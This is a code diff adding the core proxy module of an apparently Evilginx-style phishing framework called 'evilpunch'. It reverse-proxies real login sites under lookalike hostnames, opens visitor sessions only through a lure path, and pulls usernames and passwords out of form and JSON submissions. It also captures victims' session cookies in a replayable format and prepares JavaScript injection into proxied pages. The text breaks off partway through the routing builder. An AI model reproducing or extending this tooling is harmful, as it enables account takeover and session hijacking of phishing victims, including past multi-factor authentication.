@@ -1,0 +1,2586 @@
+import os
+import ssl
+import asyncio
+import threading
+import tempfile
+import subprocess
+import time
+import logging
+import traceback
+# errno is not needed; we detect EADDRINUSE via message patterns
+from pathlib import Path
+from typing import Optional, Dict, Any, Tuple, List
+from urllib.parse import urlparse
+from aiohttp import web, ClientSession, WSMsgType
+from .helpers import *
+
+# --- COLORS ---
+ANSI_GREEN = "\033[92m"
+ANSI_YELLOW = "\033[93m"
+ANSI_RED = "\033[91m"
+ANSI_BLUE = "\033[94m"
+ANSI_CYAN = "\033[96m"
+ANSI_RESET = "\033[0m"
+
+# --- CONFIGURATION ---
+# No default TARGET_HOST; routing must come from active phishlets
+TARGET_HOST = os.getenv("TARGET_HOST", "")
+PROXY_HOST = os.getenv("PROXY_HOST", "xx.in")
+PROXY_PORT = int(os.getenv("PROXY_PORT", "443"))
+BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
+DEFAULT_CERT_FILE = os.path.join(BASE_DIR, "certs", "cert.pem")
+DEFAULT_KEY_FILE = os.path.join(BASE_DIR, "certs", "key.pem")
+
+# Resolve certificate paths relative to the package root unless overridden via env
+CERT_FILE = os.getenv("CERT_FILE", DEFAULT_CERT_FILE)
+KEY_FILE = os.getenv("KEY_FILE", DEFAULT_KEY_FILE)
+FALLBACK_HTTP_PORT = int(os.getenv("PROXY_FALLBACK_PORT", "8080"))
+
+# Debug configuration
+DEBUG_MODE = os.getenv("PROXY_DEBUG", "true").lower() == "true"
+DEBUG_LEVEL = os.getenv("PROXY_DEBUG_LEVEL", "INFO").upper()
+
+# --- JAVASCRIPT INJECTION ---
+# Store temporary JavaScript endpoints: {endpoint_id: js_code}
+_temp_js_endpoints: Dict[str, str] = {}
+# ---------------------
+# ---------------------
+
+# Setup logging
+logging.basicConfig(
+    level=getattr(logging, DEBUG_LEVEL, logging.INFO),
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
+logger = logging.getLogger(__name__)
+
+def debug_log(message: str, level: str = "INFO"):
+    """Centralized debug logging with color coding"""
+    if not DEBUG_MODE:
+        return
+    
+    timestamp = time.strftime("%H:%M:%S")
+    if level == "ERROR":
+        print(f"{ANSI_RED}[{timestamp}] [ERROR] {message}{ANSI_RESET}")
+    elif level == "WARN":
+        print(f"{ANSI_YELLOW}[{timestamp}] [WARN] {message}{ANSI_RESET}")
+    elif level == "DEBUG":
+        print(f"{ANSI_CYAN}[{timestamp}] [DEBUG] {message}{ANSI_RESET}")
+    elif level == "INFO":
+        print(f"{ANSI_BLUE}[{timestamp}] [INFO] {message}{ANSI_RESET}")
+    else:
+        print(f"{ANSI_GREEN}[{timestamp}] [{level}] {message}{ANSI_RESET}")
+
+
+_server_thread: Optional[threading.Thread] = None
+_loop: Optional[asyncio.AbstractEventLoop] = None
+_runner: Optional[web.AppRunner] = None
+_site: Optional[web.TCPSite] = None
+_stop_event: Optional[threading.Event] = None
+_status: Dict[str, Any] = {"running": False, "port": None, "error": None, "scheme": None}
+
+# --- Dynamic multi-host routing state ---
+# proxy hostname (served by us) -> target hostname (origin)
+_routing_table: Dict[str, str] = {}
+_reverse_routing_table: Dict[str, str] = {}
+
+# Active proxy hostnames allowed (from DB or config)
+_active_proxy_hosts: List[str] = []
+
+# SNI: hostname -> SSLContext
+_sni_contexts: Dict[str, ssl.SSLContext] = {}
+
+# Directory where we materialize PEM files from DB to feed ssl.load_cert_chain
+_runtime_cert_dir: Optional[Path] = None
+
+# --- SESSION MANAGEMENT ---
+def generate_session_id() -> str:
+    """Generate a unique session identifier"""
+    import secrets
+    return secrets.token_urlsafe(32)
+
+def get_client_ip(request) -> str:
+    """Extract client IP address from request, handling proxies"""
+    # Check for forwarded headers first (common with reverse proxies)
+    forwarded_for = request.headers.get('X-Forwarded-For')
+    if forwarded_for:
+        # Take the first IP in the chain
+        return forwarded_for.split(',')[0].strip()
+    
+    # Check for real IP header
+    real_ip = request.headers.get('X-Real-IP')
+    if real_ip:
+        return real_ip
+    
+    # Fallback to remote address
+    if hasattr(request, 'remote') and request.remote:
+        return request.remote
+    elif hasattr(request, 'transport') and request.transport:
+        return request.transport.get_extra_info('peername')[0]
+    
+    return 'unknown'
+
+async def get_or_create_session(request, phishlet_id: int, proxy_domain: str):
+    """
+    Get existing session or create new one for this visitor on this phishlet+domain.
+    Now includes proxy authentication logic.
+    """
+    try:
+        def _session_operation():
+            from .models import Session, Phishlet
+            
+            # Get the phishlet
+            try:
+                phishlet = Phishlet.objects.get(id=phishlet_id, is_active=True)
+            except Phishlet.DoesNotExist:
+                debug_log(f"Phishlet {phishlet_id} not found or inactive", "ERROR")
+                return None
+            
+            # Check for existing session cookie
+            session_cookie = request.cookies.get(f'evilpunch_session_{phishlet_id}')
+            url_path = str(request.rel_url)
+            
+            if session_cookie:
+                # Try to find existing session - check all sessions for this phishlet and session_cookie
+                try:
+                    # First try to find any active session for this phishlet and session_cookie
+                    existing_sessions = Session.objects.filter(
+                        session_cookie=session_cookie,
+                        phishlet=phishlet,
+                        is_active=True,
+                        is_proxy_auth=True  # Only allow sessions created through proxy_auth
+                    )
+                    
+                    # Check if any of these sessions match the current domain
+                    for session in existing_sessions:
+                        if session.domain_matches(proxy_domain):
+                            debug_log(f"Found existing session: {session.get_short_session_id()} for phishlet {phishlet.name} matching domain {proxy_domain}", "DEBUG")
+                            return session.session_cookie
+                    
+                    debug_log(f"Session cookie {session_cookie[:8]}... found but no matching domain for {proxy_domain}", "DEBUG")
+                    # Continue to check proxy_auth path
+                except Exception as e:
+                    debug_log(f"Error checking existing sessions: {e}", "DEBUG")
+                    # Continue to check proxy_auth path
+            
+            
+            # Check if this is the proxy_auth path
+            proxy_auth_path = phishlet.proxy_auth
+            if not proxy_auth_path:
+                debug_log("No proxy_auth path configured for this phishlet", "WARN")
+                return None
+            
+            # Only create session if accessing the proxy_auth path
+            if url_path != proxy_auth_path:
+                debug_log(f"Access denied: {url_path} != {proxy_auth_path} (proxy_auth path)", "WARN")
+                return None
+            
+            # Create new session only when accessing proxy_auth path
+            new_session_cookie = generate_session_id()
+            client_ip = get_client_ip(request)
+            user_agent = request.headers.get('User-Agent', '')
+            
+            new_session = Session.create_session(
+                session_cookie=new_session_cookie,
+                phishlet=phishlet,
+                proxy_domain=proxy_domain,  # Set to the actual proxy domain for cross-subdomain auth
+                visitor_ip=client_ip,
+                user_agent=user_agent,
+                is_active=True,
+                is_proxy_auth=True  # Mark this session as created through proxy_auth
+            )
+            
+            debug_log(f"Created new session: {new_session.get_short_session_id()} for {client_ip} for phishlet {phishlet.name} via proxy_auth path", "INFO")
+            return new_session_cookie
+        
+        # Run in thread executor to avoid Django async issues
+        loop = asyncio.get_running_loop()
+        return await loop.run_in_executor(None, _session_operation)
+        
+    except Exception as e:
+        debug_log(f"Error in session management: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+        # Return a fallback session ID if something goes wrong
+        return generate_session_id()
+
+async def update_session_data(session_cookie: str, phishlet_id: int, proxy_domain: str, **kwargs):
+    """
+    Update session with captured data (username, password, cookies, etc.)
+    """
+    try:
+        def _update_operation():
+            from .models import Session, Phishlet
+            
+            try:
+                session = Session.objects.get(
+                    session_cookie=session_cookie,
+                    phishlet_id=phishlet_id,
+                    is_active=True
+                )
+                
+                # Update the session with new data
+                session.update_session_data(**kwargs)
+                debug_log(f"Updated session {session.get_short_session_id()} with new data", "DEBUG")
+                
+            except Session.DoesNotExist:
+                debug_log(f"Session {session_cookie[:8]}... not found for update", "WARN")
+        
+        # Run in thread executor to avoid Django async issues
+        loop = asyncio.get_running_loop()
+        await loop.run_in_executor(None, _update_operation)
+        
+    except Exception as e:
+        debug_log(f"Error updating session data: {e}", "ERROR")
+
+async def capture_form_data(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
+    """
+    Capture form data from POST requests and update session based on phishlet credential configuration
+    """
+    try:
+        if request.method == 'POST':
+            # Get the request URL path to check against auth_urls
+            request_path = str(request.rel_url)
+            debug_log(f"Checking POST request to: {request_path}", "DEBUG")
+            
+            # Get phishlet data to check auth_urls and credentials configuration
+            def _get_phishlet_credentials():
+                from .models import Phishlet
+                try:
+                    phishlet = Phishlet.objects.get(id=phishlet_id)
+                    return phishlet.data if isinstance(phishlet.data, dict) else {}
+                except Phishlet.DoesNotExist:
+                    return {}
+            
+            # Run in thread executor to avoid Django async issues
+            import asyncio
+            loop = asyncio.get_running_loop()
+            phishlet_data = await loop.run_in_executor(None, _get_phishlet_credentials)
+            
+            # Check if this URL is in the auth_urls list
+            auth_urls = phishlet_data.get('auth_urls', [])
+            credentials_config = phishlet_data.get('credentials', [])
+            
+            if not auth_urls or not credentials_config:
+                debug_log("No auth_urls or credentials configuration found", "DEBUG")
+                return
+            
+            # Check if the current request path matches any auth_urls
+            is_auth_url = False
+            for auth_url in auth_urls:
+                if auth_url.startswith('/') and request_path.startswith(auth_url):
+                    is_auth_url = True
+                    debug_log(f"Auth URL match found: {auth_url}", "INFO")
+                    break
+                elif auth_url == request_path:
+                    is_auth_url = True
+                    debug_log(f"Auth URL exact match: {auth_url}", "INFO")
+                    break
+            
+            if not is_auth_url:
+                debug_log(f"Not an auth URL, skipping credential capture", "DEBUG")
+                return
+            
+            debug_log("🎯 🟢 AUTH URL DETECTED - ATTEMPTING CREDENTIAL CAPTURE", "INFO")
+            
+            # Parse request data based on content type
+            captured_data = {}
+            
+            # Get the raw request body first to avoid consuming it multiple times
+            request_body = await request.read()
+            
+            # Store the request body in the request object for later use in forwarding
+            request['_body'] = request_body
+            
+            # Try to parse as form data
+            form_data = {}
+            try:
+                # Parse form data manually from the request body
+                import urllib.parse
+                if request_body:
+                    form_str = request_body.decode('utf-8')
+                    form_data = dict(urllib.parse.parse_qsl(form_str))
+                debug_log(f"Form data parsed: {form_data}", "DEBUG")
+            except Exception as e:
+                debug_log(f"Could not parse as form data: {e}", "DEBUG")
+            
+            # Try to parse as JSON if we need JSON data
+            json_data = None
+            if any(cred.get('type') == 'json' for cred in credentials_config):
+                try:
+                    import json
+                    json_data = json.loads(request_body.decode('utf-8'))
+                    debug_log(f"JSON data parsed: {json_data}", "DEBUG")
+                except Exception as e:
+                    debug_log(f"Could not parse as JSON: {e}", "DEBUG")
+            
+            # Process each credential configuration
+            for cred_config in credentials_config:
+                cred_type = cred_config.get('type', 'post')
+                cred_name = cred_config.get('name', '')
+                keyword = cred_config.get('keyword', '')
+                use_regex = cred_config.get('regexp', 'false').lower() == 'true'
+                regex_string = cred_config.get('regexp_string', '')
+                
+                debug_log(f"Processing credential: {cred_name} (type: {cred_type}, keyword: {keyword})", "DEBUG")
+                
+                captured_value = None
+                
+                if cred_type == 'json' and json_data:
+                    # Handle JSON type credentials
+                    if use_regex and regex_string:
+                        try:
+                            import re
+                            # Search in the JSON string representation
+                            json_str = json.dumps(json_data)
+                            match = re.search(regex_string, json_str)
+                            if match:
+                                captured_value = match.group(1)
+                                debug_log(f"🎯 🟢 REGEX MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
+                        except Exception as e:
+                            debug_log(f"Regex error for {cred_name}: {e}", "ERROR")
+                    else:
+                        # Use keyword to find in JSON
+                        if keyword in json_data:
+                            captured_value = json_data[keyword]
+                            debug_log(f"🎯 🟢 KEYWORD MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
+                
+                elif cred_type == 'post' and form_data:
+                    # Handle POST form credentials
+                    if use_regex and regex_string:
+                        try:
+                            import re
+                            # Search in form data
+                            form_str = str(dict(form_data))
+                            match = re.search(regex_string, form_str)
+                            if match:
+                                captured_value = match.group(1)
+                                debug_log(f"🎯 🟢 REGEX MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
+                        except Exception as e:
+                            debug_log(f"Regex error for {cred_name}: {e}", "ERROR")
+                    else:
+                        # Use keyword to find in form data
+                        if keyword in form_data:
+                            captured_value = form_data[keyword]
+                            debug_log(f"🎯 🟢 KEYWORD MATCH FOUND for {cred_name}: {captured_value[:10]}...", "INFO")
+                
+                # Store captured value based on credential name
+                if captured_value:
+                    if cred_name.lower() in ['username', 'user', 'email', 'login']:
+                        captured_data['captured_username'] = captured_value
+                        debug_log(f"🎯 🟢 CAPTURED USERNAME: {captured_value[:10]}...", "INFO")
+                    elif cred_name.lower() in ['password', 'pass', 'pwd']:
+                        captured_data['captured_password'] = captured_value
+                        debug_log(f"🎯 🟢 CAPTURED PASSWORD: {captured_value[:10]}...", "INFO")
+                    else:
+                        # Store in custom data
+                        if 'captured_custom' not in captured_data:
+                            captured_data['captured_custom'] = {}
+                        captured_data['captured_custom'][cred_name] = captured_value
+                        debug_log(f"🎯 🟢 CAPTURED CUSTOM DATA {cred_name}: {captured_value[:10]}...", "INFO")
+            
+            # Update session if we captured any data
+            if captured_data:
+                debug_log(f"🎯 🟢 SUCCESS: Updated session with captured data: {list(captured_data.keys())}", "INFO")
+                await update_session_data(session_cookie, phishlet_id, proxy_domain, **captured_data)
+            else:
+                debug_log("⚠️  No credentials captured from this request", "DEBUG")
+                
+    except Exception as e:
+        debug_log(f"Error capturing form data: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: str) -> dict:
+    """
+    Parse cookie metadata and create detailed cookie object
+    """
+    # Create detailed cookie object with metadata
+    cookie_info = {
+        "name": cookie_name,
+        "value": cookie_value,
+        "domain": proxy_domain,
+        "hostOnly": True,  # Default to true for proxy cookies
+        "path": "/",  # Default path
+        "secure": True,  # Default to secure for HTTPS
+        "httpOnly": False,  # Default to false
+        "sameSite": "lax",  # Default sameSite policy
+        "session": False,  # Default to false (persistent cookies)
+        "firstPartyDomain": "",
+        "partitionKey": None,
+        "expirationDate": None,  # We can't determine expiration from request
+        "storeId": None
+    }
+    
+    # Try to extract additional metadata from cookie name and value
+    if "session" in cookie_name.lower():
+        cookie_info["session"] = True
+    
+    # Detect analytics cookies
+    if cookie_name.startswith("_ga"):
+        cookie_info["session"] = False
+        cookie_info["httpOnly"] = False
+        cookie_info["secure"] = False
+    
+    # Detect forum/session cookies
+    if "forum" in cookie_name.lower():
+        cookie_info["session"] = True
+        cookie_info["httpOnly"] = True
+    
+    # Detect authentication cookies
+    if any(auth_keyword in cookie_name.lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
+        cookie_info["secure"] = True
+        cookie_info["httpOnly"] = True
+        cookie_info["sameSite"] = "strict"
+    
+    return cookie_info
+
+async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_domain: str):
+    """
+    Capture cookies from the request and update session with detailed metadata
+    """
+    try:
+        cookies = request.cookies
+        
+        if cookies:
+            # Filter out our own session cookie and capture detailed cookie info
+            captured_cookies = []
+            for name, value in cookies.items():
+                if name != f'evilpunch_session_{phishlet_id}':
+                    # Parse detailed cookie metadata
+                    cookie_info = _parse_cookie_metadata(name, value, proxy_domain)
+                    captured_cookies.append(cookie_info)
+            
+            if captured_cookies:
+                await update_session_data(
+                    session_cookie, 
+                    phishlet_id, 
+                    proxy_domain, 
+                    captured_cookies=captured_cookies
+                )
+                debug_log(f"🎯 🟢 CAPTURED {len(captured_cookies)} COOKIES with detailed metadata", "INFO")
+                for cookie in captured_cookies:
+                    debug_log(f"   🍪 {cookie['name']}: {cookie['value'][:20]}... (domain: {cookie['domain']}, secure: {cookie['secure']})", "DEBUG")
+                
+    except Exception as e:
+        debug_log(f"Error capturing cookies: {e}", "ERROR")
+        debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
+
+# --- END SESSION MANAGEMENT ---
+
+def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
+    """
+    Parse Set-Cookie header to extract detailed cookie metadata
+    Example: "sessionId=abc123; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Strict"
+    """
+    try:
+        # Split the header into parts
+        parts = set_cookie_header.split(';')
+        cookie_part = parts[0].strip()
+        
+        # Extract name and value
+        if '=' in cookie_part:
+            name, value = cookie_part.split('=', 1)
+        else:
+            name, value = cookie_part, ""
+        
+        # Initialize cookie info
+        cookie_info = {
+            "name": name.strip(),
+            "value": value.strip(),
+            "domain": proxy_domain,
+            "hostOnly": True,
+            "path": "/",
+            "secure": False,
+            "httpOnly": False,
+            "sameSite": "lax",
+            "session": False,
+            "firstPartyDomain": "",
+            "partitionKey": None,
+            "expirationDate": None,
+            "storeId": None
+        }
+        
+        # Parse attributes
+        for part in parts[1:]:
+            part = part.strip()
+            if '=' in part:
+                attr_name, attr_value = part.split('=', 1)
+                attr_name = attr_name.strip().lower()
+                attr_value = attr_value.strip()
+                
+                if attr_name == 'domain':
+                    cookie_info['domain'] = attr_value
+                    cookie_info['hostOnly'] = False
+                elif attr_name == 'path':
+                    cookie_info['path'] = attr_value
+                elif attr_name == 'samesite':
+                    cookie_info['sameSite'] = attr_value.lower()
+                elif attr_name == 'expires':
+                    # Try to parse expiration date
+                    try:
+                        import time
+                        from email.utils import parsedate_to_datetime
+                        parsed_date = parsedate_to_datetime(attr_value)
+                        cookie_info['expirationDate'] = int(parsed_date.timestamp())
+                    except:
+                        pass
+                elif attr_name == 'max-age':
+                    try:
+                        import time
+                        max_age = int(attr_value)
+                        cookie_info['expirationDate'] = int(time.time()) + max_age
+                    except:
+                        pass
+            else:
+                # Boolean attributes
+                attr_name = part.lower()
+                if attr_name == 'secure':
+                    cookie_info['secure'] = True
+                elif attr_name == 'httponly':
+                    cookie_info['httpOnly'] = True
+                elif attr_name == 'session':
+                    cookie_info['session'] = True
+        
+        # Apply intelligent defaults based on cookie name
+        if "session" in cookie_info['name'].lower():
+            cookie_info['session'] = True
+        
+        # Detect analytics cookies
+        if cookie_info['name'].startswith("_ga"):
+            cookie_info['session'] = False
+            cookie_info['httpOnly'] = False
+            cookie_info['secure'] = False
+        
+        # Detect forum/session cookies
+        if "forum" in cookie_info['name'].lower():
+            cookie_info['session'] = True
+            cookie_info['httpOnly'] = True
+        
+        # Detect authentication cookies
+        if any(auth_keyword in cookie_info['name'].lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
+            cookie_info['secure'] = True
+            cookie_info['httpOnly'] = True
+            cookie_info['sameSite'] = "strict"
+        
+        return cookie_info
+        
+    except Exception as e:
+        # Fallback to basic parsing
+        return _parse_cookie_metadata(name, value, proxy_domain)
+
+def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: str) -> dict:
+    """
+    Parse cookie metadata and create detailed cookie object
+    """
+    # Create detailed cookie object with metadata
+    cookie_info = {
+        "name": cookie_name,
+        "value": cookie_value,
+        "domain": proxy_domain,
+        "hostOnly": True,  # Default to true for proxy cookies
+        "path": "/",  # Default path
+        "secure": True,  # Default to secure for HTTPS
+        "httpOnly": False,  # Default to false
+        "sameSite": "lax",  # Default sameSite policy
+        "session": False,  # Default to false (persistent cookies)
+        "firstPartyDomain": "",
+        "partitionKey": None,
+        "expirationDate": None,  # We can't determine expiration from request
+        "storeId": None
+    }
+    
+    # Try to extract additional metadata from cookie name and value
+    if "session" in cookie_name.lower():
+        cookie_info["session"] = True
+    
+    # Detect analytics cookies
+    if cookie_name.startswith("_ga"):
+        cookie_info["session"] = False
+        cookie_info["httpOnly"] = False
+        cookie_info["secure"] = False
+    
+    # Detect forum/session cookies
+    if "forum" in cookie_name.lower():
+        cookie_info["session"] = True
+        cookie_info["httpOnly"] = True
+    
+    # Detect authentication cookies
+    if any(auth_keyword in cookie_name.lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
+        cookie_info["secure"] = True
+        cookie_info["httpOnly"] = True
+        cookie_info["sameSite"] = "strict"
+    
+    return cookie_info
+
+
+def _normalize_hostname(host: str) -> str:
+    try:
+        # strip port if present and lowercase
+        hostname = host.split(":")[0].strip().lower()
+        debug_log(f"Normalized hostname: '{host}' -> '{hostname}'", "DEBUG")
+        return hostname
+    except Exception as e:
+        debug_log(f"Error normalizing hostname '{host}': {e}", "WARN")
+        return host.strip().lower()
+
+
+def _is_wildcard_domain_match(pattern: str, hostname: str) -> bool:
+    """
+    Check if a hostname matches a wildcard domain pattern.
+    
+    Args:
+        pattern: The wildcard pattern (e.g., '.xx.in', '*.xx.in', 'xx.in')
+        hostname: The hostname to check (e.g., 'login.xx.in', 'api.xx.in')
+    
+    Returns:
+        bool: True if the hostname matches the pattern
+    
+    Examples:
+        _is_wildcard_domain_match('.xx.in', 'login.xx.in') -> True
+        _is_wildcard_domain_match('.xx.in', 'api.xx.in') -> True
+        _is_wildcard_domain_match('.xx.in', 'xx.in') -> True
+        _is_wildcard_domain_match('.xx.in', 'evil.com') -> False
+    """
+    try:
+        # Normalize both inputs
+        pattern = pattern.strip().lower()
+        hostname = hostname.strip().lower()
+        
+        # Handle different wildcard formats
+        if pattern.startswith('.'):
+            # Pattern like '.xx.in' - matches all subdomains and the base domain
+            base_domain = pattern[1:]  # Remove the leading dot
+            return hostname == base_domain or hostname.endswith('.' + base_domain)
+        elif pattern.startswith('*.'):
+            # Pattern like '*.xx.in' - matches all subdomains but not the base domain
+            base_domain = pattern[2:]  # Remove the '*.'
+            return hostname.endswith('.' + base_domain)
+        elif '*' in pattern:
+            # Pattern like '*.xx.in' (already handled above, but just in case)
+            base_domain = pattern.split('*', 1)[1]
+            if base_domain.startswith('.'):
+                base_domain = base_domain[1:]
+            return hostname.endswith('.' + base_domain)
+        else:
+            # No wildcard - exact match
+            return hostname == pattern
+            
+    except Exception as e:
+        debug_log(f"Error in wildcard domain matching: {e}", "ERROR")
+        return False
+
+
+def _get_target_host_from_routing(incoming_host: str) -> str:
+    """
+    Get the target host from the routing table, handling wildcard domain matching.
+    
+    Args:
+        incoming_host: The incoming hostname to match
+        
+    Returns:
+        str: The target host if found, None otherwise
+    """
+    try:
+        # First try exact match
+        if incoming_host in _routing_table:
+            return _routing_table[incoming_host]
+        
+        # Then try wildcard matching
+        for route_key, target_host in _routing_table.items():
+            if route_key.startswith("WILDCARD:"):
+                wildcard_pattern = route_key[9:]  # Remove "WILDCARD:" prefix
+                if _is_wildcard_domain_match(wildcard_pattern, incoming_host):
+                    debug_log(f"Wildcard match: '{incoming_host}' matches pattern '{wildcard_pattern}' -> '{target_host}'", "DEBUG")
+                    return target_host
+        
+        return None
+        
+    except Exception as e:
+        debug_log(f"Error in routing lookup: {e}", "ERROR")
+        return None
+
+
+def _ensure_runtime_cert_dir() -> Path:
+    global _runtime_cert_dir
+    if _runtime_cert_dir is None:
+        run_dir = Path(BASE_DIR) / "runtime_certs"
+        debug_log(f"Creating runtime cert directory: {run_dir}", "DEBUG")
+        run_dir.mkdir(parents=True, exist_ok=True)
+        _runtime_cert_dir = run_dir
+        debug_log(f"Runtime cert directory ready: {_runtime_cert_dir}", "DEBUG")
+    return _runtime_cert_dir
+
+
+def _write_cert_files(hostname: str, cert_pem: str, key_pem: str) -> Tuple[Path, Path]:
+    cert_dir = _ensure_runtime_cert_dir()
+    safe_host = hostname.replace("*", "wildcard").replace("/", "_")
+    cert_path = cert_dir / f"{safe_host}.cert.pem"
+    key_path = cert_dir / f"{safe_host}.key.pem"
+    
+    debug_log(f"Writing certificate files for {hostname}", "DEBUG")
+    debug_log(f"  Cert path: {cert_path}", "DEBUG")
+    debug_log(f"  Key path: {key_path}", "DEBUG")
+    
+    cert_path.write_text(cert_pem, encoding="utf-8")
+    key_path.write_text(key_pem, encoding="utf-8")
+    
+    debug_log(f"✓ Certificate files written successfully", "DEBUG")
+    return cert_path, key_path
+
+
+def _check_js_injection_match(phishlet_data: dict, incoming_host: str, request_path: str) -> List[dict]:
+    """
+    Check if the current request matches any inject_js criteria in the phishlet.
+    Returns a list of matching inject_js entries.
+    """
+    inject_js_list = phishlet_data.get('inject_js', [])
+    if not inject_js_list:
+        return []
+    
+    matching_injections = []
+    
+    # Build a mapping of target hosts to proxy hosts for this phishlet
+    target_to_proxy_mapping = {}
+    hosts_to_proxy = phishlet_data.get('hosts_to_proxy', [])
+    proxy_domain = phishlet_data.get('proxy_domain', '')
+    
+    for entry in hosts_to_proxy:
+        if isinstance(entry, dict):
+            target_host = entry.get('host', '').strip().lower()
+            proxy_sub = entry.get('proxy_subdomain', '').strip()
+            
+            if target_host and proxy_domain:
+                # Build the proxy hostname
+                if proxy_sub:
+                    proxy_host = f"{proxy_sub}.{proxy_domain}"
+                else:
+                    proxy_host = proxy_domain
+                
+                target_to_proxy_mapping[target_host] = proxy_host
+                debug_log(f"JS injection mapping: {target_host} -> {proxy_host}", "DEBUG")
+    
+    debug_log(f"JS injection host mappings: {target_to_proxy_mapping}", "DEBUG")
+    
+    for injection in inject_js_list:
+        if not isinstance(injection, dict):
+            continue
+            
+        target_host_match = injection.get('host', '').strip().lower()
+        url_pattern = injection.get('url', '').strip()
+        js_code = injection.get('js_code', '')
+        
+        if not target_host_match or not url_pattern or not js_code:
+            continue
+        
+        # Check if this target host maps to our incoming proxy host
+        proxy_host_for_target = target_to_proxy_mapping.get(target_host_match)
+        if not proxy_host_for_target:
+            debug_log(f"JS injection: no proxy mapping found for target host {target_host_match}", "DEBUG")
+            continue
+        
+        # Check if incoming host matches the proxy host for this target
+        if proxy_host_for_target.lower() != incoming_host.lower():
+            debug_log(f"JS injection: host mismatch - expected {proxy_host_for_target}, got {incoming_host}", "DEBUG")
+            continue
+        
+        # Check URL pattern match
+        if url_pattern == '*':
+            # Wildcard - matches all paths
+            url_matches = True
+        elif url_pattern.endswith('/*'):
+            # Prefix match
+            prefix = url_pattern[:-2]
+            url_matches = request_path.startswith(prefix)
+        elif url_pattern.startswith('/') and url_pattern.endswith('/*'):
+            # Path prefix match
+            prefix = url_pattern[1:-2]
+            url_matches = request_path.startswith(prefix)
+        else:
+            # Exact path match
+            url_matches = request_path == url_pattern
+        
+        if url_matches:
+            matching_injections.append(injection)
+            debug_log(f"✓ JS injection match: target_host={target_host_match}, proxy_host={proxy_host_for_target}, url={url_pattern}, path={request_path}", "INFO")
+    
+    return matching_injections
+
+
+def _create_temp_js_endpoint(js_code: str) -> str:
+    """
+    Create a temporary endpoint to serve JavaScript code.
+    Returns the endpoint ID that can be used in script tags.
+    """
+    import secrets
+    
+    endpoint_id = f"js_{secrets.token_urlsafe(16)}"
+    _temp_js_endpoints[endpoint_id] = js_code
+    
+    debug_log(f"Created temp JS endpoint: {endpoint_id}", "DEBUG")
+    return endpoint_id
+
+
+def _build_routing_from_active_phishlets() -> Dict[str, str]:
+    """
+    Build mapping of proxy host -> target host from all active phishlets.
+    Uses 'proxy_domain' and each entry in 'hosts_to_proxy' to compute proxy hostnames.
+    """
+    mapping: Dict[str, str] = {}
+    debug_log("=== BUILDING ROUTING FROM ACTIVE PHISHLETS ===", "DEBUG")
+    
+    try:
+        from .models import Phishlet  # type: ignore
+        active_phishlets = Phishlet.objects.filter(is_active=True)
+        debug_log(f"Found {active_phishlets.count()} active phishlets", "INFO")
+        
+        for phishlet in active_phishlets:
+            debug_log(f"Processing phishlet ID: {phishlet.id}", "DEBUG")
+            data = phishlet.data if isinstance(phishlet.data, dict) else {}
+            proxy_domain = str(data.get("proxy_domain", "")).strip().lower()
+            hosts_list = data.get("hosts_to_proxy") or []
+            
+            debug_log(f"  Proxy domain: '{proxy_domain}'", "DEBUG")
+            debug_log(f"  Hosts to proxy: {hosts_list}", "DEBUG")
+            
+            if not proxy_domain or not isinstance(hosts_list, list):
+                debug_log(f"  Skipping - invalid proxy_domain or hosts_list", "WARN")
+                # Try to fallback to target_url if present
+                target_url = data.get("target_url")
+                if isinstance(target_url, str) and proxy_domain:
+                    try:
+                        target_host = urlparse(target_url).hostname or ""
+                        if target_host:
+                            mapping[proxy_domain] = target_host
+                            debug_log(f"  Fallback mapping: {proxy_domain} -> {target_host}", "INFO")
+                    except Exception as e:
+                        debug_log(f"  Fallback parsing failed: {e}", "ERROR")
+                continue
+
+            for i, entry in enumerate(hosts_list):
+                debug_log(f"  Processing entry {i+1}: {entry}", "DEBUG")
+                if not isinstance(entry, dict):
+                    debug_log(f"    Skipping - not a dict", "WARN")
+                    continue
+                    
+                target_host = str(entry.get("host", "")).strip().lower()
+                # Prefer explicit proxy_subdomain, otherwise fall back to original_subdomain/orignal_subdomain
+                proxy_sub_raw = entry.get("proxy_subdomain")
+                if not (isinstance(proxy_sub_raw, str) and proxy_sub_raw.strip()):
+                    proxy_sub_raw = entry.get("original_subdomain") or entry.get("orignal_subdomain") or ""
+                proxy_sub = str(proxy_sub_raw or "").strip().lower()
+                
+                debug_log(f"    Target host: '{target_host}'", "DEBUG")
+                debug_log(f"    Proxy subdomain: '{proxy_sub}'", "DEBUG")
+                
+                if not target_host:
+                    debug_log(f"    Skipping - no target host", "WARN")
+                    continue
+                    
+                proxy_host = proxy_domain if not proxy_sub else f"{proxy_sub}.{proxy_domain}"
+                normalized_proxy = _normalize_hostname(proxy_host)
+                normalized_target = _normalize_hostname(target_host)
+                
+                # For wildcard domains, we need to handle them specially in the mapping
+                if proxy_domain.startswith('.') or '*' in proxy_domain:
+                    # Store the wildcard pattern for later matching
+                    mapping[f"WILDCARD:{proxy_domain}"] = normalized_target
+                else:
+                    mapping[normalized_proxy] = normalized_target
+                debug_log(f"    ✓ Added mapping: {normalized_proxy} -> {normalized_target}", "INFO")
+                
+                # Add reverse mapping for subdomain replacement
+                # This ensures that when someone visits xx.in, login.fluxxset.com gets replaced with login1.xx.in
+                if proxy_sub and target_host != proxy_domain:
+                    # Create the subdomain target host (e.g., login.fluxxset.com)
+                    target_subdomain = target_host.split('.')[0] if '.' in target_host else ""
+                    if target_subdomain and target_subdomain != proxy_sub:
+                        subdomain_target = f"{target_subdomain}.{target_host.split('.', 1)[1]}" if '.' in target_host else target_host
